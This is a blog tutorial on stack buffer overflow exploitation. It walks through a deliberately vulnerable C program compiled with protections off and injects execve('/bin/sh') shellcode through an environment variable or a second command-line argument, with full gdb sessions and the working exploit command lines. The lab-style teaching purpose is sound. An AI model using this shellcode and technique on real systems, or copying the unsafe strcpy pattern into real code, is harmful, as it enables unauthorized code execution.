---
layout: post
title: "Buffer overflow - other places to put shellcode"
date: 2020-01-03
tags: [security, linux, programming, vulnerabilities]
---

Continuing with old school exploitation, we'll look at a few variations of shellcode injection.

## Shellcode in an environment variable

Consider the program below:

```c
/*
 * bo_vuln2.c
 * gcc bo_vuln2.c -zexecstack -fno-stack-protector -g -o bo_vuln2
 */

#include <string.h>

void cp(char *s)
{
    char input[8];
    strcpy(input, s);
}

int main(int argc, char *argv[])
{
    if (argc > 1)
        cp(argv[1]);
    return 0;
}
```

> Note that we are still disabling security measures during compilation, and that ASLR needs to be turned off if you want to follow along.

Can this tiny buffer be exploited?

You might think that we can do something like the following:

```
| 8  a's | 8 b's | ret | 50 NOP's | shellcode |
```

Fill buffer, overwrite saved frame pointer, overwrite ret to point to NOP-sled and then follow with our NOP-sled and shellcode. This is not possible because:

- We can't have null bytes in the command line argument since the argv's strings are null-terminated.
- `strcpy` will stop writing after encountering a null byte.

Our shellcode is NULL-free, but ret is not. ret is "0x00007fff..." and the only reason we succeeded modifying it correctly in the earlier example was that ret was the last part of our input string and the stack already contained the necessary null bytes as part of the previous ret address that we overwrote.

> Some programs can be exploited without worrying about null bytes, as we will see later.

But there's a simple solution that will allow us to exploit this tiny buffer to execute a shell, putting the shellcode in an enviroment variable.

Launch gdb with shellcode in an environment variable:

```bash
env - MYSH=`python -c 'print "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'` gdb bo_vuln2
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

Find the address of the shellcode:

```bash
(gdb) b main
Breakpoint 1 at 0x401157: file bo_vuln2.c, line 16.
(gdb) r
Breakpoint 1, main (argc=1, argv=0x7fffffffed58) at bo_vuln2.c:16
...
(gdb) x/s *(char **)environ
0x7fffffffef7a: "PWD=/my/current/working/directory"
(gdb) <PRESS RETURN>
0x7fffffffef9f: "MYSH=H1\322H\273\377/bin/shH\301\353\bSH\211\347H1\300PWH\211\346\260;\017\005"
```

> Tip: you can use the gdb `start` command to run the program with a temporary breakpoint at the beginning of main.

The environment variable contains "MYSH=", so we need to add 5 bytes to the address to skip past that part: 0x7fffffffefa4.

Now we can exploit the program in gdb using:

```
(gdb) d
(gdb) r `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\xa4"[::-1]'`
...
process 18513 is executing new program: /usr/bin/bash
sh-4.4$
```

> Tip: Python helps us little-endian (reverse) the address bytes by using `[::-1]`.

And in the terminal:

```
$ env - PWD=$PWD MYSH=`python -c 'print "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'` SHLVL=0 $PWD/bo_vuln2 `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\xa4"[::-1]'`
sh-4.4$
```

Note that `$PWD` is set first, `$SHLVL` is set last, and that `$PWD` is used in front of the program to execute it with full path. Also note that our input length does not affect the location of the environment variable, so we don't need to take this into consideration.

> Tip: A huge NOP-sled in front of the shellcode can make *guessing* the correct address easier.

## Shellcode in command line argument *n*

Another option for exploiting the above program is putting the shellcode in the second command line argument and using the first command line argument to fill the buffer and overwrite ret.

Run the program in gdb using exploit code with dummy ret, break before cp returns to prevent a crash:

```bash
$ env - gdb bo_vuln2
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) disas cp
...
   0x0000000000401140 <+26>:    callq  0x401030 <strcpy@plt>
   0x0000000000401145 <+31>:    nop
...
(gdb) b *cp+31
(gdb) r `python -c 'print 16 * "a" + "bbbbbbbb" + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
```

Note the space (" ") separating the arguments. To find the address of the second argument, we can look at the bytes before `environ`:

```
(gdb) x/64xb *(char **)environ-64
0x7fffffffef61: 0x75    0x6c    0x6e    0x32    0x00    0x61    0x61    0x61
0x7fffffffef69: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffef71: 0x61    0x61    0x61    0x61    0x61    0x62    0x62    0x62
0x7fffffffef79: 0x62    0x62    0x62    0x62    0x62    0x00    0x48    0x31
0x7fffffffef81: 0xd2    0x48    0xbb    0xff    0x2f    0x62    0x69    0x6e
0x7fffffffef89: 0x2f    0x73    0x68    0x48    0xc1    0xeb    0x08    0x53
0x7fffffffef91: 0x48    0x89    0xe7    0x48    0x31    0xc0    0x50    0x57
0x7fffffffef99: 0x48    0x89    0xe6    0xb0    0x3b    0x0f    0x05    0x00
```

> `environ` is on the stack before `argv`.

The shellcode starts after the b's and NULL, at 0x7fffffffef7f.

> Since the progam is compiled with debugging information (`-g`), `p argv` shows the *address of the address* to the command line arguments. You can view strings stored at the address with `x/`*N*`s *argv` or by using `p argv[`*N*`]`.

Exploiting in gdb using the correct address:

```bash
$ env - gdb bo_vuln2
(gdb) r `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\x7f"[::-1] + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
process 17211 is executing new program: /usr/bin/bash
sh-4.4$
```

And in the terminal:

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln2 `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\x7f"[::-1] + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
sh-4.4$
```


